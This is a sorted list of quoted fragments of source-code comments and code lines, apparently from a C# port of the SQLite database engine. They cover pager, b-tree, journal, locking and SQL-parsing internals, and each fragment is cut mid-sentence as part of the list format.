" not contain a well-formed database page, then return"
" not currently open, invoke the xBegin method now."
" not enough bytes left in the journal file for a complete header, or"
" not invalidate a prior pointer, though of course the content of the buffer"
" not invoke the SELECT callback on p, but do (of course) invoke"
" not needed, here to silence compiler warning "
" not read the page from disk.  Return a pointer to the page,"
" not run. If this is not the root-page, then the moveToChild() routine"
" not set, Mem.n is zeroed."
" not, there are still machines out there that use EBCDIC.)"
" nothing to rollback, so this routine is a no-op."
" notice, and should not be referenced by programs that use SQLite."
" now be identified by a database name, a dot, then the table name: ID.ID."
" nul-terminated string pointed to by the third parameter, zSignedIdent,"
" nul-terminator), then this is handled as if no master journal name"
" null == sqlite3BtreeSchema( ppBtree, 0, null ) )"
" number as the prior appearance of the same name, or if the name"
" number greater than this, or the unused locking-page, is requested. "
" number if pCur points at an entry that is smaller than (pKey, nKey), or"
" number in the database, put the root page on the free list."
" number of  bytes read from zSql.  When nByte is non-negative, the"
" number of <u>bytes</u> in the value, not the number of characters."
" number of changes in the most recent INSERT, UPDATE, or DELETE"
" number of pages in the source database file, which may be queried by"
" number of the last page in the database, this function should return"
" number that begins with ""."".  Fall thru into the next case "
" number, or the SQL ""NULL"" value.  An implicit conversion from one"
" numbers might be 3, 8, 9, 10, 20, 23, 41, and 45.  The WhereMaskSet"
" numeric, then a numeric comparison is used. If the two values"
" nxDiv - pParent.nOverflow, szNew[i], ref rc)"
" object back to its initial state, ready to be re-executed."
" object. If the database is opened (and/or created) successfully, then"
" objects (using sqliteMalloc() directly, instead of sqlite3BtreeSchema())."
" obscure. When running in synchronous mode, this can only happen"
" occur, SQLITE_OK is returned."
" occur, no unnecessary I/O happens."
" occurred, regardless or whether or not sqlite3_backup_step() was called"
" occurs here will not be reported, causing the test to fail."
" occurs while opening the sub-journal file, then an IO error code is"
" occurs, an IO error code is returned. Or, if the EXCLUSIVE lock cannot"
" occurs, return SQLITE_SCHEMA."
" occurs, then an SQLite error code is returned. As well as [SQLITE_OK] and"
" occurs.  But other modules are free to use it too, as long as"
" occurs.  Otherwise, they return the name of the attached database, table"
" occurs.  We have to trip all the other cursors, even"
" occurs. Otherwise, it returns SQLITE_OK."
" of ""."" depending on how locale is set.  But that would cause problems"
" of ""9223373036854775808"" returns false if negFlag is false or true"
" of BtCursor.apPage[] and BtCursor.aiIdx[]. Instead of doing that,"
" of BtShared.pageSize, we have discovered that the page-size is"
" of PAGER_LOCKINGMODE_QUERY, PAGER_LOCKINGMODE_NORMAL or"
" of SQLite may require this.  In other words, the behavior exhibited"
" of SQLite to unexpected behavior - to make the code ""self-healing"""
" of TK_WHEN, TK_BEGIN or TK_FOR."
" of a ""NOT NULL"" constraint in the database schema. No need"
" of a LEFT OUTER JOIN.  In (1), the term is not disabled."
" of a database (""main"", ""temp"" or the name of an attached db). This"
" of a join, skip the search of the right table of the join"
" of a real table, not a pseudo-table."
" of a transaction but there is a read lock on the database, then"
" of all of its child journals, one after another, formatted as utf-8"
" of change in p.tz and return 0.  If a parser error occurs,"
" of columns that form the primary key.  If pList is NULL, then the"
" of consecutive 0x00 bytes in pZ. If nChar is not less than zero,"
" of conversion are done in place when it is possible, but sometimes they"
" of entries in index "", P4_STATIC )"
" of integers, where each set contains no duplicates. Each set"
" of memory at least N bytes in length, where N is the parameter."
" of nEq including 0.  If nEq==null, this routine is nearly a no-op."
" of sqlite3_open() and sqlite3_open_v2() must be UTF-8, not whatever"
" of static resources, initialization of global variables,"
" of the 'next' entry, as the previous entry is always a part of the"
" of the Btree structure. At most one of these may open a write transaction,"
" of the Gosub above, jumps to the instruction right after the Goto."
" of the [sqlite3_malloc()], [sqlite3_free()], and [sqlite3_realloc()]"
" of the code in this file is, therefore, important.  See other comments"
" of the database file used for locking (beginning at PENDING_BYTE,"
" of the debugging and testing utilities, but it should at"
" of the expression, while decending.  (In other words, the callback"
" of the functions current_time(), current_date() and current_timestamp()"
" of the iAlias-th alias is stored.  If zero, that means that the"
" of the index entry is not R. If there is no such entry, control jumps"
" of the keys prior to the final rowid, not the entire key."
" of the legacy [sqlite3_prepare()] and [sqlite3_prepare16()] interfaces,"
" of the memory cell in iColumn.  If this is an EXISTS, write"
" of the new record does not previously exist.  Except, if this"
" of the page data, starting with byte offset (pPager.pageSize%200)."
" of the page, or to the number of cells in the page if the next page"
" of the page, then the page must be corrupted. This check also"
" of the page-size, the aOvflSpace[] buffer is guaranteed to be large"
" of the record (when all fields present), then we must be dealing"
" of the result column.  The returned value is one of [SQLITE_INTEGER],"
" of the virtual table pTab. If an error occurs, an error code is returned "
" of these pages are pinned, they are implicitly unpinned, meaning that"
" of these routines, a default value is returned.  The default value"
" of this connections data, then proceed to rolling back the old,"
" of two greater than or equal to 512, and not greater than their"
" of type i64, on certain architecture (x86) with certain compiler"
" of x.  If x is text, then we actually count UTF-8 characters."
" offset).  But later on, nLimit and nOffset become the memory locations"
" on ARM7 is an issue with GCC, not with the ARM7 chip.  It seems"
" on RC4, which we know works very well."
" on disk is currently larger than nPage pages, then use the VFS"
" on how the SQLite library is compiled, this interface might not exist."
" on page 1, the transaction cannot be opened. "
" on page pFrom to page pTo. If page pFrom was not a leaf page, then"
" on the b-tree database, open one now. If a transaction is opened, it "
" on the compound select chain, p.pPrior."
" on the database already. If a write-cursor is requested, then"
" on the left side.  The left siblings are always nearly full, while the"
" on the memory, the btree layer does that."
" on the pager file (by this or any other process), it will be"
" on the same ""db"".  If xNotify==0 then any prior callbacks are immediately"
" on the value of P1. To open a new savepoint, P1==0. To release (commit) an"
" on whether the statement was prepared using the newer ""v2"" interface"
" on your program and it reports a leak because of this array, invoke"
" one ""A"") and in reg(P2)..reg(P2"
" one database file has an open write transaction, a master journal"
" one element off the stack, then we can push the new element back"
" one exception. When executing a ""DROP TABLE"" or ""DROP INDEX"" statement,"
" one now. If a transaction is opened here, then it will be closed"
" one of 1, 2, 3, 4, 5, 6, 8, or 9 - the integer serial types."
" one of SQLITE_IOERR, SQLITE_CORRUPT or SQLITE_FULL)."
" one of SQLITE_NULL, SQLITE_INTEGER, SQLITE_REAL, SQLITE_TEXT or"
" one of TK_DELETE, TK_INSERT, TK_UPDATE "
" one of the journals, the corresponding bit is set in the"
" one, or the complete transaction if there is no statement transaction."
" only the default compile-time setting, not any run-time changes"
" onto overflow pages, then accessPayload() must be used to reassemble"
" onto the stack here, and skip the stack overflow test in yy_shift()."
" opcode (OP_Eq, OP_Ge etc.) used to compare pExpr1 and pExpr2."
" opcode is encountered.  Depending on the ON CONFLICT setting, the"
" opcode use the values stored within seems dangerous. However, since"
" opcode. The context stores the last insert row id, the last statement change"
" open database file, then SQLITE_ERROR is returned. {H11307} This error"
" open on an existing shared pager-cache, do not change the pager-cache"
" opened and used.  If zFilename is the magic name "":memory:"" then"
" opened for writing. This way, the SQL transaction used to create the"
" opened if it has not been already. For a temporary file, the opening"
" opened on a file less than N bytes in size, the output buffer is"
" opening it. If a transient table is required, just use the"
" operating in direct-mode, make page 1 writable.  When not in "
" operating system.  After the following block of preprocess macros,"
" operation - if it is not, the following is a no-op).  "
" operation to finalize the journal file fails, then the code still"
" operation, then the values are not updated to account for any extra"
" operations fails, the return code is set, but the contents"
" operator is UNION, EXCEPT, or INTERSECT (but not UNION ALL)."
" or ""DROP INDEX"" query, an infinite loop might be the result."
" or ""ductile"" rather than being ""brittle"" and crashing at the first"
" or 0 if the page is not in cache. Also, return 0 if the"
" or SQLITE_TRANSIENT. If it is SQLITE_DYNAMIC, then the buffer pointed"
" or TK_STRING), then Expr.token contains the text of the SQL literal. If"
" or WinCE.  Return false (zero) for Win95, Win98, or WinME."
" or [SQLITE_UPDATE], depending on the operation that caused the callback"
" or [SQLITE_UTF16LE], indicating the most desirable form of the collation"
" or [sqlite3_open16()] is used, then flags includes at least"
" or [sqlite3_value_bytes()], then the behavior is undefined."
" or a constant) then useTypes 2, 3, and 4 return NULL."
" or a string containing only whitespace and comments, then no SQL"
" or a sub-select with a column as the return value, then the"
" or aggregate calls sqlite3GetFuncCollSeq(), this collation sequence will"
" or all contexts are check.  When a match is found, the nRef member of"
" or all of the pages in a database can get journalled.  In those cases,"
" or be destroyed on the next call to any Btree routine,"
" or constant definition does not appear in this file, then it is"
" or etFLOAT, as appropriate."
" or from temporary ""printf"" statements inserted for debugging."
" or if there is no matching Ei, the ELSE term Y, or if there is"
" or if zMaster is NULL (no master journal), then this call is a no-op."
" or is an integer that is too large to be expressed with 64 bits,"
" or more NULLs, then set rNotFound to NULL. Otherwise, set it"
" or moved root pages, so it is not sufficient to"
" or occurs outside of an explicit transaction, then you can retry the"
" or positive integer if key1 is less than, equal to or"
" or ptrmap page or a free page.  In those cases, the following"
" or sqlite3PagerCommitPhaseTwo(), the state can go back to PAGER_SHARED,"
" or sqlite3_finalize().  For a normal halt, this should be SQLITE_OK (0)."
" or sqlite3_result_blob is a non-NULL pointer, then SQLite calls that"
" or when the SQL statement completes, whichever comes first."
" or writing an index b-tree, but the schema is not loaded, then return"
" original row data. If P2 is 0, then the pseudo-table will copy the"
" original row data. Otherwise, a pointer to the original memory cell"
" other than NULL, then the test has already been run and"
" otherwise (if the message was truncated). If non-zero is returned,"
" out of range, then SQLITE_RANGE is returned. Othewise SQLITE_OK."
" out to be an overflow page, delete all overflow page-map caches"
" out to be wrong, fall back to loading the data of page"
" out to disk and so if any I/O errors occur, they will likely occur"
" out to the database file, but will be dropped from the cache. Then,"
" out to the database file, if possible. This may involve syncing the"
" output order, then the ppOrderBy is unchanged."
" outstanding at time, this parameter also reports the number of threads"
" over to a0,a1,a2.  It then calls the output subroutine"
" overflow cells in the parent page, since if any existed they will"
" overflow page is being allocated, add an entry to the pointer-map"
" overload MATCH, LIKE, GLOB, and REGEXP operators."
" override schema lock detection, so this all still"
" ovfl), this function finds the page number of the next page in the"
" p,            /"
" p, then first unlock all of the others on p->pNext, then wait"
" p.explain==2, only OP_Explain instructions are listed and these"
" p.zSql : """" )"
" p1 is 1-indexed.  So substr(x,1,1) returns the first character"
" pBtree, int iTab, u8 isWriteLock )"
" pCol.zType : """", 0 )"
" pCol.zType = columnType( sNC, p, ref bDummy, ref bDummy, ref bDummy )"
" pColl.zName : ""null"" ) )"
" pCtx,"
" pCur.info.nHeader), pBuf, pBufOffset, (u32)a, eOp, pPage.pDbPage)"
" pExpr is a comparison expression, eg. '=', '<', IN(...) etc."
" pExpr.x.pList.nExpr : 0, enc, 0 )"
" pExprList -> If this is an INSERT INTO ... VALUES ... statement, then"
" pFilE.sharedLockByte, 0, 1, 0)"
" pFile.sharedLockByte, 0, 1, 0)"
" pFile.sharedLockByte, 1 )"
" pFrom.z is used, then pTo.z points to the same thing as pFrom.z"
" pI64 = sqlite3DbMallocRaw( pParse->db, sizeof( value ) )"
" pIdx = pIdx.pNext, i"
" pIdx = pIdx.pNext, iCur"
" pIdx = pIdx.pNext, idx"
" pIdx = pIdx.pNext, j"
" pIdx = pIdx.pNext, nIdx"
" pIn1.z.Substring( 0, pIn1.n )"
" pIter now points at the 64-bit integer key value, a variable length"
" pList.nExpr : 0, 0,"
" pLoop = pLoop.pNext, n"
" pLoop = pLoop.pPrior, cnt"
" pMem.n < pMem.z.Length ) pMem.z = pMem.z.Substring( 0, pMem.n )"
" pMem.n, (int)( len - pMem.n ) )"
" pMem.z.Substring(0, pMem.n) : pMem.z)"
" pName1 and pName2. If the table name was fully qualified, for example:"
" pName1.z might be NULL, but not pName1 itself "
" pOp.p4.z : """""
" pOp.zComment : """""
" pPKey2->rowid to the value of the rowid field in (pKey1, nKey1)."
" pPage contains cells that point to overflow pages, set the pointer"
" pPage. Make the parent page writable, so that the new divider cell"
" pParent = pParent.pPrior, pSub = pSub.pPrior )"
" pParse,        /"
" pParse.cookieMask field.  Later, after all other code has been"
" pParse.zErrMsg == """" )"
" pPrev = pp, pp = pp.pNext ) "
" pSelect   -> If this is an INSERT INTO ... SELECT ... statement, then"
" pSelect is correlated, not constant "
" pTab from the database, including triggers and temporary triggers."
" pTab.aCol[iCol].zName : ""rowid"" )"
" pTemp is not null.  Regardless of pTemp, allocate a new entry"
" pZ is a UTF-16 encoded unicode string. If nChar is less than zero,"
" pZ is a UTF-8 encoded unicode string. If nByte is less than zero,"
" page (pParent) the parent page becomes overfull, this buffer is"
" page are used in the balancing, though both siblings might come from one"
" page before the balancing, then the pointer map entries associated"
" page cache memory is needed beyond what is provided by this option, then"
" page caused the database file to grow, update dbFileSize."
" page clean, the IO error code is returned. If the page cannot be"
" page contain a special header (the ""file header"") that describes the file."
" page iParent, pointer type ptrType. If not, append an error message"
" page in the block above, set the need-sync flag for the page."
" page in the pager cache. In this case just update the pager cache,"
" page in this overflow list, check that the pointer-map entry for"
" page is at most 8198 bytes, which may be stored as a 2-byte"
" page is not already in the cache, then the expected behaviour of the"
" page number of the first overflow page is stored in aOverflow[0],"
" page pgno before the 'move' operation, it needs to be retained"
" page that does not need to be journaled.  Nevertheless, be sure"
" page, including overflow cells, are copied into the child. The root"
" page-list cache, if any, then fall back to the getOverflowPage()"
" page. For each iteration, variable iOff is set to the byte offset"
" page. This function deletes that reference, so after it returns the"
" pager is in PAGER_UNLOCK state when this function is called,"
" pager is in an error state other than SQLITE_FULL when this is called,"
" pager_cksum( pPager, aData ) != cksum )"
" pages.  When that is so, this routine can be used to access the"
" parameter ""n"" is the total size of the buffer, including space for"
" parameter P1, P2, and P4 as if this were a Halt instruction.  If the"
" parameter indicating the number of arguments passed to the aggregate,"
" parameter into the previous register, then simply increment the"
" parameter is 0, this is a read operation (data copied into"
" parameter is non-zero, then auto-vacuum mode is enabled. If zero, it"
" parameter, which must be one of SQLITE_UTF16BE, SQLITE_UTF16LE or"
" parameter. If the value passed is SQLITE_TRANSIENT, then the"
" parameters (also called ""host parameter names"" or ""SQL parameters"")"
" parameters that attempt to write past the end of the existing data,"
" parseDateOrTime( context, z, ref p ) != 0 )"
" parseHhMmSs( zDate.Substring( zIndex ), p ) == 0 )"
" parseModifier( z, p ) != 0 )"
" parseTimezone( zDate.Substring( zIndex ), p ) != 0 ) return 1"
" parsing a CREATE TABLE statement.  A ""NOT NULL"" constraint has"
" particular aggregate, SQLite allocates nBytes of memory, zeroes out that"
" passed as the first argument. This is always one of EXPR_FULLSIZE,"
" passed to this function, we assume a malloc() failed during sqlite3_open()."
" passes over the data.  Furthermore, because the temporary table"
" pattern and the second argument is the string.  So, the SQL statements:"
" patternCompare( inPattern.Substring( inPattern.Length - zPattern.Length - 1 ), zString.Substring( len ), pInfo, esc ) == false )"
" payload is spilled to overflow pages.  Once an overflow page is allocated,"
" payload size, so it is impossible for payloadSize64 to be"
" penalty is paid for this ""if"" statement."
" percent less (x86 linux, gcc version 4.1.2, -O6) than if"
" performance boost to bulk delete or insert operations. However, if"
" performed during statement evaluation in [sqlite3_step()], unless"
" performed on the table, and, if that operation is an UPDATE, if at"
" point in calling this function again), return SQLITE_DONE."
" point in the future, using a call to sqlite3PagerWrite(), its contents"
" point, return SQLITE_DONE."
" pointer as an object.  The [sqlite3_open()], [sqlite3_open16()], and"
" pointer itself, it just cleans up subsiduary resources (i.e. the contents"
" pointer to a subsequent overflow page. If this is the case, then"
" pointer to an array of Column structures, one for each column."
" pointer to the FuncDef structure that defines that function, or return"
" pointer, possibly even a NULL pointer."
" pointer.  In other words, it could be that there has been a prior"
" pointer. Once the nested trigger has been coded, the pNext value is restored"
" pointers,"
" pointing to.  The update hook will be invoked, if it exists."
" points during the compilation process, as logic is being created"
" popped.  Or if pParse==0, this routine is a no-op."
" populated, then moved using sqlite3PagerMovepage()."
" positive integer, we have to fall through to the second"
" possibilities. If the free-list is currently empty, or if the first"
" possibly used for a transaction later on. On some systems, the"
" potentially be a ""glob"" expression.  Return true (1) if they"
" ppOrderBy is a pointer to the ORDER BY clause of a SELECT statement,"
" pragma, make sure it is open."
" precisely the amount of memory consumed by sqlite, the way in which "
" precision--, e2"
" prefferred for UTF-8, the second UTF-16le, and the third UTF-16be."
" prefix to reflect your program's name, so that if your program exits"
" prefix, we insure that the name will not collide with an existing"
" prematurely, old temporary files can be easily identified. This can be done"
" prepared queries. If such a query is out-of-date, we do not want to"
" present on disk, then the journal is not hot and does not need to be"
" presents to client programs.  If a C-function, structure, datatype,"
" previous connections transaction), and a crash or power-failure"
" previously contains an entry associated with newKey, it should be"
" previously stored on a leaf node, and its reported size was 4"
" prior call to sqlite3SelectExpand().  When that happens, let"
" prior memory allocation to be at least N bytes, where N is the"
" prior successful call to [sqlite3_open()], [sqlite3_open_v2()] or"
" prior to using any other SQLite interface.  For maximum portability,"
" problem, we delay 100 milliseconds and try to delete again.  Up"
" problem. When the page is next fetched by the b-tree layer, it"
" problematic header will occur, if it exists. aMagic is used"
" problems for other processes at some point in the future. So, just"
" process aborts.  If X is false and assert() is disabled, then the"
" process and if this is the final header in the journal, then it means"
" process has started, no new elements may be inserted."
" process is complete.  If nFin is zero, it is assumed that"
" processes text encoded in UTF-16 (CollSeq.xCmp16), using the machine"
" processing, the ""interlocked"" magic is probably not"
" profiling or testing, for example.</dd>"
" property of the host file-system, this is safe."
" pseudo-table is read at least once, the corresponding bit of the output"
" publicly, only to user functions defined in func.c."
" purposes (for example, to store a high-level schema associated with"
" putVarint( pCell, 4, (u64)info.nKey )"
" pzTail !=""""){"
" query, then the caller will only allow the loop to run for"
" query.  If the subquery has more than one element in its FROM clause,"
" quote(name) "" "
" rc = ptrmapGet(pBt, nearby, ref eType, ref Dummy0)"
" rc = sqlite3BtreeClearTable(p, (int)iTable, ref Dummy0)"
" re-executed (from a call to sqlite3_reset()). The nVar, nMem, nCursor"
" reaches 0, set the shared state to TRANS_NONE. The unlockBtreeIfUnused()"
" reaches zero, call the xDisconnect() method to delete the object."
" read by this instruction) is currently held, it is necessary to"
" read from the database file. In some cases, the pcache module may"
" read-locked while it is actually being read, it is not locked"
" read-only access, sqlite3_backup_step() may return [SQLITE_READONLY] if"
" readability.  From this point on down, the normal indentation rules are"
" readers.  If it is unable to promote the lock, then the in-memory"
" readsTable( pParse, addrSelect, iDb, pTab ) )"
" recent TK_DOT or TK_ON. This means that when a WHEN, FOR or BEGIN"
" recently changed, so the entry for this table already exists in"
" record in the table. If it is left pointing at the next record, then"
" record, or if the end of the last field appears to be before the end"
" recursively. If this condition is detected, the nested trigger is not coded."
" redefined.  The length of the name is limited to 255 bytes, exclusive of"
" redirected to xMalloc.  Similarly, we know that nByte>0 becauses"
" refer to those indices, a complete table scan can be avoided and the"
" reference count drops to 0, then it is made elible for recycling."
" reference to the page, add an error message to pCheck.zErrMsg."
" refers VDBE cursor number that holds the table open, not to the root"
" register P3.  Or, if boolean index P1 is initially empty, leave P3"
" register might be in the cache in multiple places, so be sure to"
" representation is already stored using the requested encoding, then this"
" request a definition of the collating sequence. If this doesn't work,"
" request it. If the collation factory does not supply such a sequence,"
" request, then increment "
" request.  In this case, set the value NULL or to P4 if P4 is"
" requested is ok.  When the callback returns [SQLITE_DENY], the"
" requested page is not already stored in the cache, then no"
" requested, return SQLITE_LOCKED."
" required that a statement transaction was not active, but this restriction"
" required, as an xSync() callback may add an attached database"
" required, it is allocated and populated here. It is then stored as"
" res == 0 )//(res = LockFile(pFile.fs.SafeFileHandle.DangerousGetHandle().ToInt32(), PENDING_BYTE, 0, 1, 0)) == 0)"
" resetFlag is true, then the highest record value is reset after"
" resize fails, set the mallocFailed flag inthe connection object."
" resolveCompoundOrderBy( pParse, pLeftmost ) != 0 )"
" resolveOrderGroupBy( sNC, p, p.pOrderBy, ""ORDER"" ) != 0 )"
" resources obtained by the mutex methods implementation, especially"
" result as a string or blob but if the string or blob is too large, it"
" result codes].  However, experience has shown that many of"
" result of a PRIMARY KEY or UNIQUE clause on a column definition, or"
" result-set expression.  Otherwise, the expression is resolved in"
" retried. If it returns zero, then the SQLITE_BUSY error is"
" return 1, and so forth."
" return [SQLITE_OK] to allow the action, [SQLITE_IGNORE] to disallow the"
" return [SQLITE_SCHEMA].  But unlike the legacy behavior, [SQLITE_SCHEMA] is"
" return negative, zero or positive if the first string is less than,"
" return the number of bytes up to (but not including), the first pair"
" returned by SQLite as a result of an error in a function.  By default,"
" returned, clean-up the statement handle."
" returned, loop through the tables list of triggers. For each trigger"
" returned.  If a memory allocation error occurs, NULL is returned."
" returned.  If the input is not a keyword, TK_ID is returned."
" returned. In this case there is no ""blocking connection"", so invoking"
" returned. Otherwise, SQLITE_OK."
" returned. This is analagous to renameTableFunc() above, except for CREATE"
" returns 0, the operation aborts with an SQLITE_BUSY error."
" returns a value larger than this, then MAX_SECTOR_SIZE is used instead."
" returns false, then you do not really know for certain if the two"
" returns non-zero, then the [COMMIT] is converted into a [ROLLBACK]."
" returns true if the two strings are equal, otherwise false."
" reuseUnlikely flag passed to this function is true, the page is added"
" rollback, ABORT processing, [DROP TABLE], or by any other"
" rollback, undoing any changes made to the parent page."
" rolled back if an explicit ""ROLLBACK"" statement is executed, or"
" root page in the database file, then the last root page"
" root page number of the index.  If memRootPage is negative, then"
" root page of a b-tree.  If it is not, then the cursor acquired"
" root pages are kept at the beginning of the database file, which"
" routine expects to be passed pointers to strings encoded using UTF-8,"
" routine is called, it is a no-op (returns SQLITE_OK)."
" routine is implemented as a macro that only works when in debugging mode,"
" routine just before the ""exit"" code."
" routine on the same Vdbe at the same time, they both might end"
" routine, pagerStress() would not write the current page content to"
" routine, then a pointer to a dummy VdbeOp will be returned.  That opcode"
" routine.  Thus INSERT OR FAIL, INSERT OR IGNORE, INSERT OR ROLLBACK,"
" routines, which form the built-in memory allocation subsystem."
" row is updated, inserted or deleted."
" rowid field were equal, then clear the PREFIX_SEARCH flag and set"
" running calls to [sqlite3_exec()], [sqlite3_step()] and"
" running the code, it invokes the callback once for each instruction."
" runs.  Beginning with SQLite version 3.5.0, the soft heap limit is"
" runtime, then a register is allocated and the register number written"
" said memory is allocated and released, and the policies used to "
" same as TK_AND, in1, in2, out3 "
" same as TK_BITAND, in1, in2, out3 "
" same as TK_BITNOT, in1 "
" same as TK_BITOR, in1, in2, out3 "
" same as TK_CONCAT, in1, in2, out3 "
" same as TK_EQ, jump, in1, in3 "
" same as TK_FLOAT, out2-prerelease "
" same as TK_GE, jump, in1, in3 "
" same as TK_GT, jump, in1, in3 "
" same as TK_ISNULL, jump, in1 "
" same as TK_LE, jump, in1, in3 "
" same as TK_LSHIFT, in1, in2, out3 "
" same as TK_LT, jump, in1, in3 "
" same as TK_MINUS, in1, in2, out3 "
" same as TK_NE, jump, in1, in3 "
" same as TK_NOT, in1 "
" same as TK_NOTNULL, jump, in1 "
" same as TK_OR, in1, in2, out3 "
" same as TK_PLUS, in1, in2, out3 "
" same as TK_REM, in1, in2, out3 "
" same as TK_RSHIFT, in1, in2, out3 "
" same as TK_SLASH, in1, in2, out3 "
" same as TK_STAR, in1, in2, out3 "
" same as TK_STRING, out2-prerelease "
" same as TK_TO_BLOB, in1 "
" same as TK_TO_INT, in1 "
" same as TK_TO_NUMERIC, in1 "
" same as TK_TO_REAL, in1 "
" same as TK_TO_TEXT, in1 "
" same callback function, then instead of invoking the callback function"
" same name are registered, the behavior is undefined.  If a"
" same time, unless they are unlucky and choose the same lock byte."
" satisfies the conditions of this routine, it returns NULL."
" save the results, and reuse the same result on subsequent invocations."
" saved position info stored by saveCursorPosition(), so there can be"
" savepoint identified by parameter iSavepoint, depending on the value"
" savepoint, then save the current contents of the page into the"
" savepoint. If no errors occur, SQLITE_OK is returned."
" saving that record, use it as a key to delete elements from"
" scan is correct for the ORDER BY clause, then that index is used and"
" schema change.  Hence, the application should ensure that the"
" schema information, the Lookaside.bEnabled flag is cleared so that"
" schema is being reloaded for some reason), the VTable objects are not "
" schema is shared, as the implementation often stores the database"
" schemas, including all the same indices, then a special optimization"
" scratch buffers or if no scratch buffer space is specified, then SQLite"
" second argument, bPurgeable, is true if the cache being created will"
" second argument, not the first, as the argument to test to"
" seconds after the minute - [0,59] "
" seconds extension (the "".FFF"") is optional.  The seconds portion"
" segment is synced. If a crash occurs during or following this,"
" select with data coming from a VALUES clause, the code executes"
" separating it out, the code will be automatically omitted from"
" sequence of the index being opened. Otherwise, if P4 is an integer"
" sequence), NULL is returned and the state of pParse updated to reflect"
" sequence. If so, and there are active VMs, return busy. If there"
" sequences, or changing an authorization function are the types of"
" set in the bitvec. Whenever a leaf page is extracted from the free-list,"
" set of pages are synced to disk together. So, if the page this function"
" set on all attached databases, as well as the main db file."
" set the cursor state to ""invalid"". This makes common insert operations"
" set to 0, then truncate the journal file to zero bytes in size. Otherwise,"
" set, then the string is nul terminated. The MEM_Int and MEM_Real"
" setSharedCacheTableLock()), or SQLITE_LOCKED if not."
" sets the BtShared.db member of each of the BtShared structures, ensuring"
" setting a pointer map entry is a relatively expensive operation, this"
" setting up a default [sqlite3_vfs] module, or setting up"
" shared between multiple connections.  In that case, each contection"
" shared-cache feature disabled, then there is only ever one user"
" shared-cache lock and SQLITE_LOCKED is returned to the caller, the"
" shared-cache table, and more than one other connection currently holds"
" sharing the same database file, each connection has it own"
" should return either SQLITE_OK, SQLITE_DENY, or SQLITE_IGNORE.  If"
" shows that the page 'nearby' is somewhere on the free-list, then"
" side of the comparison, it remains Debug.Associated with the same side after"
" since sqlite3ReleaseTempRange() was called, it is safe to do so."
" since the most recent journal header was written, update the"
" since we know that if eLock==WRITE_LOCK, then no other connection"
" single quotes) in place of the %Q option.  So, for example, one could say:"
" single row, for example the row corresponding to a new index"
" situations arise, then subsequent insert operations might corrupt"
" size, and so forth.  P1==0 is the main database file and P1==1 is the"
" sizeof( Mem ), "
" skipped.  Or, if the children are satisfied by an index, the original"
" slightly faster, but it is also larger and much harder to test."
" small cells will be rare, but they are possible."
" so, abort any other statements this handle currently has active."
" so, don't bother creating this one. This only applies to"
" so, return without deleting the master journal file."
" soft heap limit, [sqlite3_release_memory()] is invoked one or"
" some architectures, the value overflows to (1<<63). On others,"
" some other database connection is holding a write-lock, which in"
" something of a bug, but I do not know how to fix it."
" something other than [SQLITE_ROW], the results are undefined."
" sorted already.  If there is a binary tree on p.pTree, then"
" source code file ""vdbe.c"".  When that file became too big (over"
" space than that limit allows for, truncate it now. There is no need"
" spanSet(yygotominor.yy346, yymsp[-2].minor.yy0, yymsp[0].minor.yy0)"
" specified by {nKey1, pKey1} and pPKey2.  It returns a negative, zero"
" specified number of hours, minutes, seconds, and fractional seconds"
" specify a KeyInfo structure the flags byte is set to 0x05 or 0x0D,"
" spelled backwards.  So the temp files are still identified, but"
" spread out over the non-negative integers.  For example, the cursor"
" sqlite versions only work for ASCII characters, regardless of locale."
" sqlite3ApiExit(), to avoid setting the database handle error message."
" sqlite3AtoF( z.ToString().Substring( 8 ), ref r ) != 0 //getValue( z[8], ref r ) > 0"
" sqlite3Atoi64( pRec.z, ref value ) )"
" sqlite3AuthCheck(pParse, SQLITE_SAVEPOINT, az[op], zName, 0)"
" sqlite3AuthCheck(pParse, code, zName, 0, zDb) ){"
" sqlite3BitvecTest( pBitvec, 0 )"
" sqlite3BitvecTest( pBitvec, sz "
" sqlite3BitvecTest( pDone, pgno ) != 0 )"
" sqlite3BitvecTest( pPager.pInJournal, pg ) == 0 )"
" sqlite3BitvecTest(p, pgno) != 0))"
" sqlite3BtreeCommitPhaseOne(), then there is a chance that the"
" sqlite3BtreeEnterAll(). If all mutexes are not already held, the"
" sqlite3BtreeNext( pCrsr, ref res ) :"
" sqlite3BtreeSetPageSize( pTemp, db.nextPagesize, nRes, 0 ) != 0 )"
" sqlite3DbFree() containing an error message, if one is available."
" sqlite3DbMalloc(), using the connection handle stored in VTable.db as "
" sqlite3EndBenignMalloc() are called, respectively."
" sqlite3FindIndex( db, zName, zDb ) != null )"
" sqlite3FixSelect( sFix, pSelect ) != 0"
" sqlite3FixTriggerStep( sFix, pTrig.step_list ) != 0 )"
" sqlite3Get4byte(pPtrmap, offset "
" sqlite3GetInt32( pToken.z.ToString(), ref iValue ) == false )"
" sqlite3GetVTable( pParse.db, pTab ).pMod.pModule.xUpdate == null )"
" sqlite3GetVTable(db, pTab) ){"
" sqlite3GetVTable(p,db, pTab) : null"
" sqlite3GlobalConfig.m, 0, sizeof( sqlite3GlobalConfig.m))"
" sqlite3IdListDup(), and sqlite3SrcListDup() can not be further expanded"
" sqlite3IsNumber( pRec.z, ref realnum, pRec.enc ) != 0 )"
" sqlite3KeywordCode( zIdent, j ) != TK_ID"
" sqlite3LocateCollSeq( pParse, zColl ) == null )"
" sqlite3Malloc, to be freed when the Vdbe is finalized."
" sqlite3MemRelease() were called from here. With -O2, this jumps"
" sqlite3PagerGet() occurs, the state transitions to PAGER_SHARED."
" sqlite3PagerJournalSizeLimit() API. See also ""PRAGMA journal_size_limit""."
" sqlite3PagerPagecount( pPager, ref idummy )"
" sqlite3PagerWrite() on page 1, then modifying the contents of the"
" sqlite3RowSetNext( pIdx.u.pRowSet, ref val ) == 0"
" sqlite3SelectDup(), can be called. sqlite3SelectDup() is sometimes"
" sqlite3Step() to do most of the work.  If a schema error occurs,"
" sqlite3StrICmp( ""new"", zTab ) == 0 )"
" sqlite3StrICmp( ""old"", zTab ) == 0 )"
" sqlite3StrICmp( db.aDb[iDb].zName, zDb ) != 0 )"
" sqlite3StrICmp( db.aDb[j].zName, zDb ) != 0 ) continue"
" sqlite3StrICmp( pColl.zName, pIdx.azColl[j] ) != 0 ) continue"
" sqlite3StrICmp( pColl.zName, zColl ) != 0 )"
" sqlite3StrICmp( pIdx.zName, zIndex ) != 0 "
" sqlite3StrICmp( pSavepoint.zName, zName ) != 0 "
" sqlite3StrICmp( z1, z2 ) != 0 ) break"
" sqlite3StrICmp( zAs, zCol ) == 0 )"
" sqlite3StrICmp( zDatabase, db.aDb[j].zName ) != 0 ) continue"
